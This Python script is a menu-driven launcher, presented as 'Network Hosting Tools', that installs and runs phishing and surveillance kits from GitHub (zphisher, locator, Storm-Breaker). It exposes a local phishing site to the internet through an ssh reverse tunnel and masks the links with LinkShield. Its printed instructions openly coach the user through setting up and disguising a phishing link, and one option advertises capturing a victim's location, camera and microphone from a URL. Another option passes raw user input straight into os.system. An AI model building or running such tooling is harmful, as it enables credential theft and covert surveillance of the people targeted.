import os
os.system("cd ..")
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def host_ping():
    pass

def host_lookup():
    pass

def push_local():
    por = input('what port would you like to forward: ')
    os.system(f'ssh -R 80:localhost:{por} nokey@localhost.run')


def main():
    while True:
        clear_screen()
        print("**** Network Hosting Tools ****")
        print("1. Ping a Host")
        print("2. DNS Lookup")
        print("3. Push Local Port")
        print("4. Mask URL with LinkShield")
        print("5. ZphisherAutomation")
        print("6. OSINT Automation -coming soon")
        print("7. Location form url")
        print("8. Location, Camera, Microphone form url (BETTER)")
        print("9. Use GHPM shell to launch other application")
        print("10. Quit")

        choice = input("Select an option (1-10): ")

        if choice == '1':
            host_ping()
        elif choice == '2':
            host_lookup()
        elif choice == '3':
            push_local()
        elif choice == '4':
            module = 'https://github.com/smoke-wolf/LinkShield.git'
            print('when shown a list, select option (1)')
            os.system(f'cd .. && cd GitHub-Package-Manager && python3 gh.py -I {module}')
            os.system('cd .. && cd GitHub-Package-Manager && python3 gh.py -LG')
            nvum = input('enter the value corresponding to "LinkShield": ')
            os.system(f'cd .. && cd GitHub-Package-Manager && python3 gh.py -LG {nvum}')
        elif choice == '5':
            module = 'https://github.com/htr-tech/zphisher.git'
            os.system(f'cd .. && cd GitHub-Package-Manager && python3 gh.py -I {module}')
            os.system('cd .. && cd GitHub-Package-Manager && python3 gh.py -LG')
            print('''
            ====
            IF you're on mac, open a new instance of this tool, and once you've set your fishing site to localhost
            use this tool to then forward it to the internet with 'push local port'. then use LinkShield to mask your
            phishing link.
            ====
            ''')
            nvum = input('enter the value corresponding to "zphisher": ')
            os.system(f'cd .. && cd GitHub-Package-Manager && python3 gh.py -LG {nvum}')
        elif choice == '6':
            # Implement Option 6 functionality
            pass
        elif choice == '7':
            print('enter the value corresponding to locator.sh": ')
            module = 'https://github.com/yuhisern7/locator.git'
            os.system(f'cd .. && cd GitHub-Package-Manager && python3 gh.py -I {module}')
            os.system('cd .. && cd GitHub-Package-Manager && python3 gh.py -LG')
            print('''
                        ====
                        IF you're on mac, open a new instance of this tool,
                        and once you've set up your phishing site,
                        use LinkShield to mask your phishing link.
                        ====
                        ''')
            nvum = input('enter the value corresponding to locator.sh": ')
            os.system(f'cd .. && cd GitHub-Package-Manager && python3 gh.py -LG {nvum}')
        elif choice == '8':
            print(('enter the value corresponding to st.py": '))
            module = 'https://github.com/ultrasecurity/Storm-Breaker.git'
            os.system(f'cd .. && cd GitHub-Package-Manager && python3 gh.py -I {module}')
            os.system('cd .. && cd GitHub-Package-Manager && python3 gh.py -LG')
            print('''
                                    ====
                                    IF you're on mac, open a new instance of this tool,
                                    and once you've set up your phishing site,
                                    use LinkShield to mask your phishing link.
                                    ====
                                    ''')
            nvum = input('enter the value corresponding to st.py": ')
            os.system(f'cd .. && cd GitHub-Package-Manager && python3 gh.py -LG {nvum}')
        elif choice == '9':
            print('''
        -I -> Install (arg<repo>) 
        -IL -> Install Local (arg<dir>)

        -LA -> List All Installs (arg<int>)
        -LL -> Launch Local Directory (arg<int>)
        -LG -> Launch Git Project (arg<int>)
        -LC -> Launch Advanced Projects

        -UG -> Uninstall GitHub Projects
        -UL -> Uninstall Local directories''')
            while True:
                delta = input('Enter gh option ("break" to exit shell: ')
                if delta == 'break':
                    break
                os.system(f'cd .. && cd GitHub-Package-Manager && python3 gh.py {delta}')

        elif choice == '10':
            print("Goodbye!")
            break
        else:
            print("Invalid option. Please select a valid option (1-10).")

if __name__ == "__main__":
    main()
